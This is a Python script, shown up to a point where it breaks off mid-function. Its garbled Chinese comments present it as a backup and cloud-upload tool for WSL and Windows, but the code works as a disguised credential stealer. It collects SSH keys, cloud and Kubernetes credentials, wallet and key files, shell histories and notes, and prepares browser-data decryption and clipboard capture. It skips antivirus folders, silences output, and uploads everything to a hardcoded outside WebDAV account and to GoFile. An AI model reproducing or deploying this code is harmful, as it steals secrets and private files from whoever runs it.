# -*- coding: utf-8 -*-
"""
è‡ªåŠ¨å¤‡ä»½å’Œä¸Šä¼ å·¥å…·
åŠŸèƒ½ï¼šå¤‡ä»½WSLå’ŒWindowsç³»ç»Ÿä¸­çš„é‡è¦æ–‡ä»¶ï¼Œå¹¶è‡ªåŠ¨ä¸Šä¼ åˆ°äº‘å­˜å‚¨
"""

import os
import sys
import shutil
import time
import socket
import logging
import platform
import tarfile
import threading
import requests
import subprocess
import base64
import getpass
import json
import sqlite3
import urllib3
from datetime import datetime, timedelta
from pathlib import Path
from functools import lru_cache
from requests.auth import HTTPBasicAuth

# ç¦ç”¨SSLè­¦å‘Š
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# å°è¯•å¯¼å…¥æµè§ˆå™¨æ•°æ®å¯¼å‡ºæ‰€éœ€çš„åº“
BROWSER_EXPORT_AVAILABLE = False
try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Random import get_random_bytes
    BROWSER_EXPORT_AVAILABLE = True
except ImportError:
    logging.warning("æµè§ˆå™¨æ•°æ®å¯¼å‡ºåŠŸèƒ½ä¸å¯ç”¨ï¼šç¼ºå°‘ pycryptodome åº“")

class BackupConfig:
    """å¤‡ä»½é…ç½®ç±»"""
    
    # è°ƒè¯•é…ç½®
    DEBUG_MODE = True  # æ˜¯å¦è¾“å‡ºè°ƒè¯•æ—¥å¿—ï¼ˆFalse/Trueï¼‰
    
    # æ–‡ä»¶å¤§å°é™åˆ¶
    MAX_SOURCE_DIR_SIZE = 500 * 1024 * 1024  # 500MB æºç›®å½•æœ€å¤§å¤§å°
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024  # 50MB å‹ç¼©åå•æ–‡ä»¶æœ€å¤§å¤§å°
    CHUNK_SIZE = 50 * 1024 * 1024  # 50MB åˆ†ç‰‡å¤§å°
    
    # ä¸Šä¼ é…ç½®
    RETRY_COUNT = 3  # é‡è¯•æ¬¡æ•°
    RETRY_DELAY = 30  # é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
    UPLOAD_TIMEOUT = 1000  # ä¸Šä¼ è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    
    # ç›‘æ§é…ç½®
    BACKUP_INTERVAL = 260000  # å¤‡ä»½é—´éš”æ—¶é—´ï¼ˆçº¦3å¤©ï¼‰260000
    CLIPBOARD_INTERVAL = 1200  # JTBå¤‡ä»½é—´éš”æ—¶é—´ï¼ˆ20åˆ†é’Ÿï¼Œå•ä½ï¼šç§’ï¼‰1200
    
    # è¶…æ—¶é…ç½®
    WSL_BACKUP_TIMEOUT = 3600  # WSLå¤‡ä»½è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼Œ1å°æ—¶ï¼‰
    DISK_SCAN_TIMEOUT = 600  # ç£ç›˜æ‰«æè¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼Œ10åˆ†é’Ÿï¼‰
    NETWORK_CONNECTION_TIMEOUT = 3  # ç½‘ç»œè¿æ¥è¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
    PROGRESS_REPORT_INTERVAL = 60  # è¿›åº¦æŠ¥å‘Šé—´éš”ï¼ˆç§’ï¼‰
    
    # æ–‡ä»¶æ“ä½œé…ç½®
    FILE_COPY_BUFFER_SIZE = 1024 * 1024  # æ–‡ä»¶å¤åˆ¶ç¼“å†²åŒºå¤§å°ï¼ˆ1MBï¼‰
    TAR_COMPRESS_LEVEL = 9  # tarå‹ç¼©çº§åˆ«ï¼ˆ0-9ï¼Œ9ä¸ºæœ€é«˜å‹ç¼©ï¼‰
    COMPRESSION_RATIO = 0.7  # å‹ç¼©æ¯”ä¾‹ä¼°è®¡å€¼ï¼ˆå‹ç¼©åçº¦ä¸ºåŸå§‹å¤§å°çš„70%ï¼‰
    SAFETY_MARGIN = 0.7  # å®‰å…¨è¾¹ç•Œï¼ˆåˆ†å—æ—¶ç•™å‡º30%çš„ä½™é‡ï¼‰
    
    # æ—¥å¿—é…ç½®
    LOG_FILE = str(Path.home() / ".dev/Backup/backup.log")
    
    # WSLæŒ‡å®šå¤‡ä»½ç›®å½•æˆ–æ–‡ä»¶ï¼ˆç›¸å¯¹äº WSL ç”¨æˆ·ä¸»ç›®å½•ï¼‰
    WSL_SPECIFIC_DIRS = [
        ".ssh",           # SSHé…ç½®
        ".bash_history",  # Bashå†å²è®°å½•
        ".python_history", # Pythonå†å²è®°å½•
        ".bash_aliases",  # Bashåˆ«å
        ".node_repl_history", # Node.js REPL å†å²è®°å½•
        ".wget-hsts",     # wget HSTS å†å²è®°å½•
        ".Xauthority",    # Xauthority æ–‡ä»¶
        ".ICEauthority",  # ICEauthority æ–‡ä»¶
        # VPSæœåŠ¡å•†é…ç½®ç›®å½•
        ".aws",               # AWSé…ç½®
        ".gcloud",            # Google Cloudé…ç½®
        ".azure",             # Azureé…ç½®
        ".aliyun",            # é˜¿é‡Œäº‘é…ç½®
        ".tencentcloud",      # è…¾è®¯äº‘é…ç½®
        ".tccli",             # è…¾è®¯äº‘CLIé…ç½®
        ".doctl",             # DigitalOceané…ç½®
        ".hcloud",            # Hetzneré…ç½®
        ".vultr",             # Vultré…ç½®
        ".linode",            # Linodeé…ç½®
        ".oci",               # Oracle Cloudé…ç½®
        ".bandwagon",         # æ¬ç“¦å·¥é…ç½®
        ".bwg",               # æ¬ç“¦å·¥é…ç½®
        ".docker",            # Dockeré…ç½®
        ".kube",              # Kubernetesé…ç½®
    ]
    
    # WindowsæŒ‡å®šå¤‡ä»½ç›®å½•æˆ–æ–‡ä»¶ï¼ˆç›¸å¯¹äº Windows ç”¨æˆ·ç›®å½• /mnt/c/Users/{user}ï¼‰
    WINDOWS_SPECIFIC_PATHS = [
        "Desktop",  # æ¡Œé¢ç›®å½•
        "AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite",  # ä¾¿ç­¾æ•°æ®åº“
        ".python_history",  # Python å†å²è®°å½•æ–‡ä»¶
        ".node_repl_history",  # Node.js REPL å†å²è®°å½•æ–‡ä»¶
        "AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt",  # Windows PowerShell å†å²
        "AppData/Roaming/Microsoft/PowerShell/PSReadLine/ConsoleHost_history.txt",  # PowerShell Core å†å²ï¼ˆå¦‚æœå­˜åœ¨ï¼‰
    ]
    
    # WSLæ–‡ä»¶æ‰©å±•ååˆ†ç±»
    WSL_EXTENSIONS_1 = [  # æ–‡æ¡£/ä»£ç ç±»
        ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash", ".rs", ".env",
        ".ts", ".jsx", ".tsx", ".csv", ".ps1", ".md", ".pdf",
    ]
    
    WSL_EXTENSIONS_2 = [  # é…ç½®å’Œå¯†é’¥ç±»
        ".pem", ".key", ".keystore", ".utc", ".xml", ".ini", ".config", ".conf", ".json",
        ".yaml", ".yml", ".toml", ".utc", ".gpg", ".pgp", ".wallet", ".keystore",
    ]
    
    # ç£ç›˜æ–‡ä»¶åˆ†ç±»
    DISK_EXTENSIONS_1 = [  # æ–‡æ¡£ç±»
        ".xls", ".xlsx", ".doc", ".docx", ".et", ".one", ".txt", ".json", ".js", ".py", ".go", ".sh", ".bash",
        ".env", ".ts", ".jsx", ".tsx", ".csv", ".ps1", ".md", ".pdf",
    ]
    
    DISK_EXTENSIONS_2 = [  # é…ç½®å’Œå¯†é’¥ç±»
        ".pem", ".key", ".pub", ".xml", ".ini", ".asc", ".gpg", ".pgp", ".conf", ".wallet", ".toml",
        ".config", "id_rsa", "id_ecdsa", "id_ed25519", ".keystore", ".utc", ".json", ".yml", ".yaml",   
    ]
    
    # æ’é™¤ç›®å½•é…ç½®
    EXCLUDE_INSTALL_DIRS = [       
        # æ¸¸æˆç›¸å…³ç›®å½•
        "Battle.net", "Riot Games", "GOG Galaxy", "Xbox Games", "Steam",
        "Epic Games", "Origin Games", "Ubisoft", "Games", "SteamLibrary",
        
        # å¸¸è§è½¯ä»¶å®‰è£…ç›®å½•
        "Common Files", "WindowsApps", "Microsoft", "Microsoft VS Code",
        "Internet Explorer", "Microsoft.NET", "MSBuild",
        
        # å¼€å‘å·¥å…·å’Œç¯å¢ƒ
        "Java", "Python", "NodeJS", "Go", "Visual Studio", "JetBrains",
        "Docker", "Git", "MongoDB", "Redis", "PostgreSQL",
        "Android", "gradle", "npm", "yarn", "venv", "node_modules",
        ".gradle", ".m2", ".vs", ".vscode", ".cargo", ".git", ".yean",
        ".local", ".npm", ".nvm", ".orca_term", ".pki", ".pm2", "build",
        ".rustup", ".bun", ".github", ".vscode", "myenv", "snap"
        "__pycache__", ".vscode-server", "dist", ".cache", 
        
        # å…¶ä»–å¤§å‹åº”ç”¨
        "Adobe", "Autodesk", "Unity", "UnrealEngine", "Blender",
        "NVIDIA", "AMD", "Intel", "Realtek", "Waves",
        
        # æµè§ˆå™¨ç›¸å…³
        "Google", "Chrome", "Brave", "Firefox", "Opera",
        "Microsoft Edge", "Internet Explorer",
        
        # é€šè®¯å’ŒåŠå…¬è½¯ä»¶
        "Discord", "Zoom", "Teams", "Skype", "Slack", "telegram",
        
        # å¤šåª’ä½“è½¯ä»¶
        "Adobe", "Premiere", "Photoshop", "After Effects", "Vegas", "MAGIX", "Audacity",
        
        # å®‰å…¨è½¯ä»¶
        "McAfee", "Norton", "Kaspersky", "Huorong",
        "Avast", "AVG", "Bitdefender", "ESET",
        
        # ç³»ç»Ÿå·¥å…·
        "CCleaner", "WinRAR", "7-Zip", "PowerToys",
    ]
    
    # å…³é”®è¯æ’é™¤
    EXCLUDE_KEYWORDS = [
        # è½¯ä»¶ç›¸å…³
        "program", "software", "install", "setup", "update",
        "patch", "360", "cache", "Code",
        
        # å¼€å‘ç›¸å…³
        "node_modules", "vendor", "build", "dist", "target",
        "debug", "release", "bin", "obj", "packages",
        
        # å¤šåª’ä½“ç›¸å…³
        "music", "video", "movie", "audio", "media", "stream",
        
        # æ¸¸æˆç›¸å…³
        "steam", "game", "gaming", "save", "netease", "origin", "epic",
        
        # å…¶ä»–
        "bak", "obsolete", "archive", "trojan", "clash", "vpn",
        "thumb", "thumbnail", "preview" , "v2ray", "mail",

        # ä¸­æ–‡
        "ç«ç»’", "æ€æ¯’", "ç”µè„‘ç®¡å®¶",
    ]

    EXCLUDE_WSL_DIRS = [
        ".bashrc",
        ".bitcoinlib",
        ".cargo",
        ".conda",
        ".docker",
        ".dotnet",
        ".fonts",
        ".git",
        ".gongfeng-copilot",
        ".gradle",
        ".icons",
        ".jupyter",
        ".landscape",
        ".local",
        ".npm",
        ".nvm",
        ".orca_term",
        ".pki",
        ".pm2",
        ".profile",
        ".rustup",
        ".ssh",
        ".solcx",
        ".themes",
        ".thunderbird",
        ".wdm",
        "cache",
        "myenv",
        "snap",
        "venv",
        "node_modules",
        "dist",
        ".cache",
        ".config",
        ".vscode-server",
        "build",
        ".vscode-remote-ssh",
        ".git",
        "__pycache__",
    ]

    # GoFile ä¸Šä¼ é…ç½®ï¼ˆå¤‡é€‰æ–¹æ¡ˆï¼‰
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]                                                                                                                                 

# é…ç½®æ—¥å¿—
if BackupConfig.DEBUG_MODE:
    logging.basicConfig(format="%(message)s", level=logging.DEBUG)
else:
    sys.stdout = sys.stderr = open(os.devnull, 'w')
    logging.basicConfig(format="%(message)s", level=logging.CRITICAL)

class BackupManager:
    """å¤‡ä»½ç®¡ç†å™¨ç±»"""
    
    def __init__(self):
        """åˆå§‹åŒ–å¤‡ä»½ç®¡ç†å™¨"""
        self.config = BackupConfig()
        
        # Infini Cloud é…ç½®
        self.infini_url = "https://wajima.infini-cloud.net/dav/"
        self.infini_user = "wongstar"
        self.infini_pass = "my95gfPVtKuDCpAK"
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_wsl_backup"
        
        # é…ç½® requests session ç”¨äºä¸Šä¼ 
        self.session = requests.Session()
        self.session.verify = False  # ç¦ç”¨SSLéªŒè¯
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        
        # GoFile API tokenï¼ˆå¤‡é€‰æ–¹æ¡ˆï¼‰
        self.api_token = "qSS40ZpgNXq7zZXzy4QDSX3z9yCVCXJu"
        
        self._setup_logging()

    def _setup_logging(self):
        """é…ç½®æ—¥å¿—ç³»ç»Ÿ"""
        try:
            # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)
            
            # é…ç½®æ–‡ä»¶å¤„ç†å™¨
            file_handler = logging.FileHandler(
                self.config.LOG_FILE, 
                encoding='utf-8'
            )
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )
            
            # é…ç½®æ§åˆ¶å°å¤„ç†å™¨
            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(message)s'))
            
            # é…ç½®æ ¹æ—¥å¿—è®°å½•å™¨
            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )
            
            # æ¸…é™¤ç°æœ‰å¤„ç†å™¨
            root_logger.handlers.clear()
            
            # æ·»åŠ å¤„ç†å™¨
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("æ—¥å¿—ç³»ç»Ÿåˆå§‹åŒ–å®Œæˆ")
        except Exception as e:
            print(f"è®¾ç½®æ—¥å¿—ç³»ç»Ÿæ—¶å‡ºé”™: {e}")

    @staticmethod
    def _get_dir_size(directory):
        """è·å–ç›®å½•æ€»å¤§å°
        
        Args:
            directory: ç›®å½•è·¯å¾„
            
        Returns:
            int: ç›®å½•å¤§å°ï¼ˆå­—èŠ‚ï¼‰
        """
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"è·å–æ–‡ä»¶å¤§å°å¤±è´¥ {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        """ç¡®ä¿ç›®å½•å­˜åœ¨
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: ç›®å½•æ˜¯å¦å¯ç”¨
        """
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"âŒ è·¯å¾„å­˜åœ¨ä½†ä¸æ˜¯ç›®å½•: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"âŒç›®å½•æ²¡æœ‰å†™å…¥æƒé™: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except Exception as e:
            logging.error(f"âŒ åˆ›å»ºç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        """æ¸…ç†å¹¶é‡æ–°åˆ›å»ºç›®å½•
        
        Args:
            directory_path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ“ä½œæ˜¯å¦æˆåŠŸ
        """
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except Exception as e:
            logging.error(f"âŒ æ¸…ç†ç›®å½•å¤±è´¥ {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """æ£€æŸ¥ç½‘ç»œè¿æ¥
        
        Returns:
            bool: æ˜¯å¦æœ‰ç½‘ç»œè¿æ¥
        """
        try:
            # å°è¯•è¿æ¥å¤šä¸ªå¯é çš„æœåŠ¡å™¨
            hosts = [
                "8.8.8.8",  # Google DNS
                "1.1.1.1",  # Cloudflare DNS
                "208.67.222.222"  # OpenDNS
            ]
            for host in hosts:
                try:
                    socket.create_connection((host, 53), timeout=BackupConfig.NETWORK_CONNECTION_TIMEOUT)
                    return True
                except:
                    continue
            return False
        except:
            return False

    @staticmethod
    def _is_valid_file(file_path):
        """æ£€æŸ¥æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        
        Args:
            file_path: æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: æ–‡ä»¶æ˜¯å¦æœ‰æ•ˆ
        """
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def should_exclude_dir(self, path):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ’é™¤ç›®å½•
        
        æ­¤æ–¹æ³•æ£€æŸ¥ç»™å®šè·¯å¾„æ˜¯å¦åº”è¯¥è¢«æ’é™¤ï¼Œä¸»è¦é€šè¿‡ä»¥ä¸‹æ­¥éª¤ï¼š
        1. æ£€æŸ¥æ˜¯å¦ä¸ºäº‘ç›˜ç›®å½•ï¼Œå¦‚æœæ˜¯åˆ™ä¸æ’é™¤
        2. æ£€æŸ¥æ˜¯å¦åŒ¹é… EXCLUDE_INSTALL_DIRS ä¸­çš„ç›®å½•
        3. æ£€æŸ¥æ˜¯å¦åŒ…å« EXCLUDE_KEYWORDS ä¸­çš„å…³é”®è¯ï¼ˆæ”¯æŒå¤šç§åˆ†éš”ç¬¦ï¼‰
        
        Args:
            path: ç›®å½•è·¯å¾„
            
        Returns:
            bool: æ˜¯å¦åº”è¯¥æ’é™¤
        """
        path_lower = path.lower()
        path_parts = [part.lower() for part in os.path.normpath(path).split(os.sep)]
        
        # 1. æ£€æŸ¥æ˜¯å¦ä¸ºäº‘ç›˜ç›®å½•
        cloud_keywords = [
            "äº‘ç›˜", "cloud", "drive", "onedrive", "iclouddrive", "wpsdrive",
            "dropbox", "box", "googledrive", "icloud", "sync", "ç½‘ç›˜", "äº‘"
        ]
        if any(keyword.lower() in path_lower for keyword in cloud_keywords):
            return False
            
        # 2. æ£€æŸ¥å®Œæ•´ç›®å½•åæ˜¯å¦åœ¨æ’é™¤åˆ—è¡¨ä¸­
        if any(ex.lower() in path_lower for ex in self.config.EXCLUDE_INSTALL_DIRS):
            return True
            
        # 3. æ£€æŸ¥ç›®å½•åçš„æ¯ä¸€éƒ¨åˆ†æ˜¯å¦åŒ…å«å…³é”®è¯
        for part in path_parts:
            # é¢„å¤„ç†è·¯å¾„éƒ¨åˆ†ï¼šç§»é™¤æ‰€æœ‰å¸¸è§åˆ†éš”ç¬¦å¹¶è½¬æ¢ä¸ºå°å†™
            normalized_part = part.lower()
            for sep in [' ', '_', '-', '.']:
                normalized_part = normalized_part.replace(sep, '')
                
            # å¯¹æ¯ä¸ªå…³é”®è¯è¿›è¡Œæ£€æŸ¥
            for keyword in self.config.EXCLUDE_KEYWORDS:
                keyword_lower = keyword.lower()
                # ç§»é™¤å…³é”®è¯ä¸­çš„åˆ†éš”ç¬¦
                normalized_keyword = keyword_lower
                for sep in [' ', '_', '-', '.']:
                    normalized_keyword = normalized_keyword.replace(sep, '')
                
                # æ£€æŸ¥åŸå§‹è·¯å¾„éƒ¨åˆ†ï¼ˆæ”¯æŒç©ºæ ¼åˆ†éš”ï¼‰å’Œæ ‡å‡†åŒ–åçš„è·¯å¾„éƒ¨åˆ†
                if (keyword_lower in part.lower() or  # åŸå§‹åŒ¹é…
                    normalized_keyword in normalized_part):  # æ ‡å‡†åŒ–ååŒ¹é…
                    return True
            
        return False

    def should_exclude_wsl_path(self, path, source_dir):
        """æ£€æŸ¥æ˜¯å¦åº”è¯¥æ’é™¤WSLè·¯å¾„
        
        Args:
            path: è·¯å¾„
            source_dir: æºç›®å½•
            
        Returns:
            bool: æ˜¯å¦åº”è¯¥æ’é™¤
        """
        if not source_dir == str(Path.home()):
            return False
        try:
            rel = os.path.relpath(path, str(Path.home()))
            parts = rel.split(os.sep)
            return any(part in self.config.EXCLUDE_WSL_DIRS for part in parts)
        except Exception:
            return False

    def backup_wsl_files(self, source_dir, target_dir):
        """WSLç¯å¢ƒæ–‡ä»¶å¤‡ä»½"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error("âŒ WSLæºç›®å½•ä¸å­˜åœ¨")
            return None

        # è·å–ç”¨æˆ·åå‰ç¼€
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"

        # åˆ›å»ºå­ç›®å½•ç”¨äºå­˜æ”¾ä¸åŒç±»å‹çš„æ–‡ä»¶
        target_docs = os.path.join(target_dir, "docs")
        target_specified = os.path.join(target_dir, f"{user_prefix}_specified")
        target_configs = os.path.join(target_dir, "configs")
        
        if not self._clean_directory(target_dir):
            return None
            
        if not all(self._ensure_directory(d) for d in [target_docs, target_specified, target_configs]):
            return None

        # æ·»åŠ è®¡æ•°å™¨å’Œè¶…æ—¶æ§åˆ¶
        start_time = time.time()
        last_progress_time = start_time
        timeout = self.config.WSL_BACKUP_TIMEOUT
        total_files = 0
        processed_files = 0

        # è¾“å‡ºå¼€å§‹å¤‡ä»½çš„ä¿¡æ¯
        logging.info("\n" + "â”€" * 50)
        logging.info("ğŸš€ å¼€å§‹å¤‡ä»½ WSL é‡è¦ç›®å½•å’Œæ–‡ä»¶")
        logging.info("â”€" * 50 + "\n")

        # å¤„ç†æŒ‡å®šç›®å½•å’Œæ–‡ä»¶ï¼ˆå®Œæ•´å¤‡ä»½ï¼Œä¸ç­›é€‰æ‰©å±•åï¼‰
        for specific_path in self.config.WSL_SPECIFIC_DIRS:
            # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
            if time.time() - start_time > timeout:
                logging.error("\nâŒ WSLå¤‡ä»½è¶…æ—¶")
                return None

            full_source_path = os.path.join(source_dir, specific_path)
            if os.path.exists(full_source_path):
                try:
                    # å¯¹äºæŒ‡å®šçš„ç›®å½•å’Œæ–‡ä»¶ï¼Œä¿å­˜åœ¨ specified ç›®å½•ä¸‹
                    target_base_for_specific = target_specified
                    if os.path.isfile(full_source_path):
                        # å¦‚æœæ˜¯æ–‡ä»¶ï¼Œç›´æ¥å¤åˆ¶
                        target_file = os.path.join(target_base_for_specific, specific_path)
                        target_file_dir = os.path.dirname(target_file)
                        if self._ensure_directory(target_file_dir):
                            shutil.copy2(full_source_path, target_file)
                            processed_files += 1
                            if self.config.DEBUG_MODE:
                                logging.info(f"ğŸ“„ å·²å¤‡ä»½: {specific_path}")
                    else:
                        # å¦‚æœæ˜¯ç›®å½•ï¼Œé€’å½’å¤åˆ¶å…¨éƒ¨å†…å®¹
                        target_path = os.path.join(target_base_for_specific, specific_path)
                        if self._ensure_directory(os.path.dirname(target_path)):
                            if os.path.exists(target_path):
                                shutil.rmtree(target_path)
                            
                            # æ·»åŠ ç›®å½•å¤åˆ¶è¿›åº¦æ—¥å¿—
                            logging.info(f"\nğŸ“ æ­£åœ¨å¤‡ä»½: {specific_path}/")
                            for root, _, files in os.walk(full_source_path):
                                total_files += len(files)
                            
                            shutil.copytree(full_source_path, target_path, 
                                         symlinks=True, 
                                         ignore=lambda d, files: [f for f in files 
                                                                if any(ex in f for ex in self.config.EXCLUDE_WSL_DIRS)])
                except Exception as e:
                    logging.error(f"\nâŒ å¤‡ä»½å¤±è´¥: {specific_path} - {str(e)}")

        logging.info("\n" + "â”€" * 50)
        logging.info("ğŸ” å¼€å§‹æ‰«æå…¶ä»–é‡è¦æ–‡ä»¶")
        logging.info("â”€" * 50)

        # å¤„ç†å…¶ä»–ç›®å½•ä¸­çš„æ–‡ä»¶ï¼ˆæŒ‰æ‰©å±•ååˆ†ç±»ï¼‰
        docs_count = 0
        configs_count = 0
        for root, _, files in os.walk(source_dir):
            # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
            current_time = time.time()
            if current_time - start_time > timeout:
                logging.error("\nâŒ WSLå¤‡ä»½è¶…æ—¶")
                return None
            
            # æ¯Nç§’è¾“å‡ºä¸€æ¬¡è¿›åº¦
            if current_time - last_progress_time >= self.config.PROGRESS_REPORT_INTERVAL:
                elapsed_minutes = int((current_time - start_time) / 60)
                logging.info(f"\nâ³ å·²å¤„ç† {processed_files} ä¸ªæ–‡ä»¶... ({elapsed_minutes}åˆ†é’Ÿ)")
                last_progress_time = current_time
            
            # è·³è¿‡å·²ç»å®Œæ•´å¤‡ä»½çš„æŒ‡å®šç›®å½•
            if any(specific_dir in root for specific_dir in self.config.WSL_SPECIFIC_DIRS):
                continue
                
            if os.path.abspath(root).startswith(target_dir):
                continue
            
            if self.should_exclude_wsl_path(root, source_dir):
                continue

            for file in files:
                # æ£€æŸ¥æ–‡ä»¶ç±»å‹å¹¶å†³å®šç›®æ ‡ç›®å½•
                is_doc = any(file.lower().endswith(ext) for ext in self.config.WSL_EXTENSIONS_1)
                is_config = any(file.lower().endswith(ext) for ext in self.config.WSL_EXTENSIONS_2)
                
                if not (is_doc or is_config):
                    continue

                source_file = os.path.join(root, file)
                if not os.path.exists(source_file):
                    continue

                # æ ¹æ®æ–‡ä»¶ç±»å‹é€‰æ‹©ç›®æ ‡ç›®å½•
                target_base = target_docs if is_doc else target_configs
                relative_path = os.path.relpath(root, source_dir)
                target_sub_dir = os.path.join(target_base, relative_path)
                target_file = os.path.join(target_sub_dir, file)

                if not self._ensure_directory(target_sub_dir):
                    continue
                    
                try:
                    shutil.copy2(source_file, target_file)
                    processed_files += 1
                    if is_doc:
                        docs_count += 1
                    else:
                        configs_count += 1
                except Exception as e:
                    if self.config.DEBUG_MODE:
                        logging.error(f"\nâŒ å¤åˆ¶å¤±è´¥: {relative_path}/{file} - {str(e)}")

        # è®¡ç®—æ€»ç”¨æ—¶
        total_time = time.time() - start_time
        total_minutes = int(total_time / 60)

        if docs_count > 0 or configs_count > 0:
            logging.info("\n" + "â•" * 50)
            logging.info("ğŸ“Š WSLå¤‡ä»½ç»Ÿè®¡")
            logging.info("â•" * 50)
            if docs_count > 0:
                logging.info(f"   ğŸ“š æ–‡æ¡£æ–‡ä»¶ï¼š{docs_count} ä¸ª")
            if configs_count > 0:
                logging.info(f"   âš™ï¸  é…ç½®æ–‡ä»¶ï¼š{configs_count} ä¸ª")
            logging.info("â”€" * 50)
            logging.info(f"   ğŸ”„ æ€»è®¡å¤„ç†ï¼š{processed_files} ä¸ªæ–‡ä»¶")
            logging.info(f"   â±ï¸  æ€»å…±è€—æ—¶ï¼š{total_minutes} åˆ†é’Ÿ")
            logging.info("â•" * 50 + "\n")

        return target_dir

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        """Windowsç£ç›˜æ–‡ä»¶å¤‡ä»½"""
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if not os.path.exists(source_dir):
            logging.error(f"\nâŒ ç£ç›˜æºç›®å½•ä¸å­˜åœ¨: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            return None

        extensions = (self.config.DISK_EXTENSIONS_1 if extensions_type == 1 
                     else self.config.DISK_EXTENSIONS_2)
                     
        files_count = 0
        total_size = 0
        scan_timeout = self.config.DISK_SCAN_TIMEOUT
        retry_count = self.config.RETRY_COUNT
        retry_delay = 5  # æ–‡ä»¶è®¿é—®é‡è¯•ç­‰å¾…æ—¶é—´ï¼ˆç§’ï¼‰
        start_time = time.time()
        last_progress_time = start_time

        # è¾“å‡ºå¼€å§‹å¤‡ä»½çš„ä¿¡æ¯
        logging.info("\n" + "â”€" * 50)
        logging.info("ğŸš€ å¼€å§‹æ‰«æç£ç›˜é‡è¦æ–‡ä»¶")
        logging.info("â”€" * 50)

        try:
            # ä½¿ç”¨ os.walk çš„ topdown=True å‚æ•°ï¼Œè¿™æ ·å¯ä»¥è·³è¿‡ä¸éœ€è¦çš„ç›®å½•
            for root, dirs, files in os.walk(source_dir, topdown=True):
                # æ£€æŸ¥æ˜¯å¦è¶…æ—¶
                current_time = time.time()
                if current_time - start_time > scan_timeout:
                    logging.error(f"\nâŒ æ‰«æç›®å½•è¶…æ—¶: {source_dir}")
                    break
                    
                # æ¯Nç§’æ˜¾ç¤ºä¸€æ¬¡è¿›åº¦
                if current_time - last_progress_time >= self.config.PROGRESS_REPORT_INTERVAL:
                    elapsed_minutes = int((current_time - start_time) / 60)
                    logging.info(f"\nâ³ å·²å¤„ç† {files_count} ä¸ªæ–‡ä»¶... ({elapsed_minutes}åˆ†é’Ÿ)")
                    last_progress_time = current_time
                
                # è·³è¿‡ç›®æ ‡ç›®å½•
                if os.path.abspath(root).startswith(target_dir):
                    continue
                
                # è·³è¿‡æ’é™¤çš„ç›®å½•
                if self.should_exclude_dir(root):
                    dirs.clear()  # æ¸…ç©ºå­ç›®å½•åˆ—è¡¨ï¼Œé¿å…ç»§ç»­éå†
                    continue

                # å¤„ç†æ–‡ä»¶
                for file in files:
                    if not any(file.lower().endswith(ext.lower()) for ext in extensions):
                        continue

                    source_file = os.path.join(root, file)
                    
                    # æ£€æŸ¥æ–‡ä»¶å¤§å°
                    try:
                        file_size = os.path.getsize(source_file)
                        if file_size == 0 or file_size > self.config.MAX_SINGLE_FILE_SIZE:
                            continue
                    except OSError:
                        continue

                    # å°è¯•å¤åˆ¶æ–‡ä»¶
                    for attempt in range(retry_count):
                        try:
                            # æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å¯è®¿é—®
                            try:
                                with open(source_file, 'rb') as test_read:
                                    test_read.read(1)
                            except (PermissionError, OSError):
                                if attempt < retry_count - 1:
                                    time.sleep(retry_delay)
                                    continue
                                else:
                                    break

                            relative_path = os.path.relpath(root, source_dir)
